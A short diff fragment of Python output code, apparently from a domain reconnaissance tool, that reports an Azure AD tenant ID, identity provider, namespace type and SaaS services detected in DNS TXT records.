+    if recon_result.tenant_id:
+        reporter.info(f"Azure AD: Tenant verified (ID: {recon_result.tenant_id})")
+    else:
+        reporter.info("Azure AD: No tenant found")
+    if recon_result.idp_name:
+        reporter.info(f"IdP: {recon_result.idp_name} ({recon_result.idp_host})")
+    if recon_result.namespace_type:
+        reporter.info(f"Namespace: {recon_result.namespace_type}")
+
+    reporter.info("")
+    reporter.info("--- SaaS Footprint ---")
+    if result.txt_services:
+        reporter.info(", ".join(result.txt_services))
+    else:
+        reporter.info("No SaaS services detected in TXT records")
